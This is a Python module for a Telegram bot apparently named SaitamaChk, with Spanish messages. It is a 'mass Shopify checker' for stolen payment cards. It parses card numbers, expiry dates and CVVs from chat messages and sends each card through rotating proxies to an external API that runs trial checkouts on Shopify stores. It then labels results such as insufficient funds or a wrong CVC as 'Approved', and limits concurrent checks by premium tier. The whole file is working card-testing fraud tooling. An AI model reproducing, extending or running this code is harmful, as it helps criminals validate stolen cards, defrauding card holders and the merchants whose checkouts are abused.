# msh.py - Mass Shopify Checker para SaitamaChk (FINAL)

import re
import time
import random
import asyncio
import aiohttp

import db
from antispam import antispam_guard
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler, MessageHandler, filters

BOT_TAG = '<a href="http://t.me/SaitamaChecker_Bot">[拳]</a>'

# ==============================
# CONFIG
# ==============================

API_URL = "https://shopi-production-7ef9.up.railway.app/"
REQUEST_TIMEOUT = 60
CONNECT_TIMEOUT = 20
MAX_CCS = 20

CC_REGEX = r'(\d{14,16})[:,.;/\\|\s]+(\d{1,2})[:,.;/\\|\s]+(\d{2,4})[:,.;/\\|\s]+(\d{3,4})'

busy_users = {}

# ==============================
# LIMITES
# ==============================

def get_limit(uid: int) -> int:
    return 4 if db.is_owner(uid) or db.is_admin(uid) or db.is_premium(uid) else 2

def can_run(uid: int) -> bool:
    return busy_users.get(uid, 0) < get_limit(uid)

def mark_start(uid: int):
    busy_users[uid] = busy_users.get(uid, 0) + 1

def mark_end(uid: int):
    if uid in busy_users:
        busy_users[uid] -= 1
        if busy_users[uid] <= 0:
            busy_users.pop(uid, None)

# ==============================
# HELPERS
# ==============================

def extract_cards(text: str):
    matches = re.findall(CC_REGEX, text)
    cards = []
    for n, mm, yy, cvv in matches[:MAX_CCS]:
        cards.append({
            "number": n,
            "month": mm.zfill(2),
            "year": yy[-2:],
            "cvv": cvv
        })
    return cards

def build_cc(card):
    year = f"20{card['year']}" if int(card["year"]) <= 50 else f"19{card['year']}"
    return f"{card['number']}|{card['month']}|{year}|{card['cvv']}"

def format_site(site):
    return site if site.startswith("http") else f"https://{site}"

def format_proxy(proxy):
    return proxy if proxy.count(":") >= 3 else f"{proxy}:user:pass"

# ==============================
# STATUS
# ==============================

def status_from_response(resp: str) -> str:
    if not resp:
        return "Error ⚠️"

    r = resp.upper().replace(" ", "_")

    if any(x in r for x in (
        "3D_AUTHENTICATION", "OTP_REQUIRED", "INSUFFICIENT_FUNDS",
        "INCORRECT_ZIP", "ORDER_COMPLETED", "ORDER_PLACED", "THANK_YOU"
    )):
        return "Approved ✅"

    if any(x in r for x in ("INCORRECT_CVC", "INVALID_CVC")):
        return "Approved CCN ✅"

    if any(x in r for x in (
        "CARD_DECLINED", "GENERIC_ERROR", "INCORRECT_NUMBER",
        "PROCESSING_ERROR", "FRAUD_SUSPECTED", "RISKY"
    )):
        return "Declined ❌"

    return "Error ⚠️"

# ==============================
# API CALL
# ==============================

async def check_shopify(card, site, proxy):
    params = {
        "cc": build_cc(card),
        "url": format_site(site),
        "proxy": format_proxy(proxy)
    }

    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)

    try:
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(API_URL, params=params) as r:
                if r.status != 200:
                    return {"gateway": "Normal", "price": "0", "response": f"HTTP_{r.status}"}

                data = await r.json()
                return {
                    "gateway": data.get("Gate", "Normal"),
                    "price": data.get("Price", "0"),
                    "response": data.get("Response", "N/A")
                }
    except asyncio.TimeoutError:
        return {"gateway": "Normal", "price": "0", "response": "TIMEOUT"}
    except Exception as e:
        return {"gateway": "Normal", "price": "0", "response": str(e)[:60]}

# ==============================
# /MSH
# ==============================

async def handle_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user = update.effective_user.username or update.effective_user.first_name
    msg = update.message

    if not await antispam_guard(update, context):
        return

    if not can_run(uid):
        await msg.reply_text("⏳ Límite de ejecuciones simultáneas alcanzado.", reply_to_message_id=msg.message_id)
        return

    if not db.get_user(uid):
        await msg.reply_text("❌ Debes registrarte primero.", reply_to_message_id=msg.message_id)
        return

    sites = db.get_user_shopify_sites(uid)
    proxies = db.get_user_proxies(uid)

    if not sites or not proxies:
        await msg.reply_text("❌ Necesitas sitios Shopify y proxies.", reply_to_message_id=msg.message_id)
        return

    # 👉 MENSAJE + REPLY (combinados)
    text = msg.text or ""
    if msg.reply_to_message and msg.reply_to_message.text:
        text += "\n" + msg.reply_to_message.text

    cards = extract_cards(text)
    if not cards:
        await msg.reply_text("❌ No se detectaron CCs válidas.", reply_to_message_id=msg.message_id)
        return

    mark_start(uid)
    status_msg = await msg.reply_text("🔄 Checking...", reply_to_message_id=msg.message_id)
    start = time.time()
    blocks = []

    try:
        for card in cards:
            site_i = random.randrange(len(sites))
            proxy_i = random.randrange(len(proxies))

            data = await check_shopify(card, sites[site_i], proxies[proxy_i])
            status = status_from_response(data["response"])

            blocks.append(
                f"<b>CC:</b> <code>{build_cc(card)}</code>\n"
                f"<b>Status:</b> <code>{status}</code>\n"
                f"<b>Response:</b> <code>{data['response']}</code>\n"
                f"<b>Gateway:</b> <code>{data['gateway']} {data['price']}</code>\n"
                f"<b>Site:</b> {site_i + 1} | <b>Proxy:</b> {proxy_i + 1}\n"
                "━━━━━━━━━━━━━━━━\n"
            )

        elapsed = time.time() - start

        final = (
            f"{BOT_TAG} <b>Mass Shopify</b>\n"
            "━━━━━━━━━━━━━━━━\n"
            f"{''.join(blocks)}"
            f"{BOT_TAG} <b>Total:</b> {len(cards)}\n"
            f"{BOT_TAG} <b>Time:</b> {elapsed:.2f}s\n"
            f"{BOT_TAG} <b>Req by:</b> @{user}"
        )

        await status_msg.edit_text(final, parse_mode="HTML", disable_web_page_preview=True)

    finally:
        mark_end(uid)

# ==============================
# REGISTER
# ==============================

def register_handlers(app):
    app.add_handler(CommandHandler("msh", handle_msh))
    app.add_handler(MessageHandler(filters.Regex(r"^\.msh\b"), handle_msh))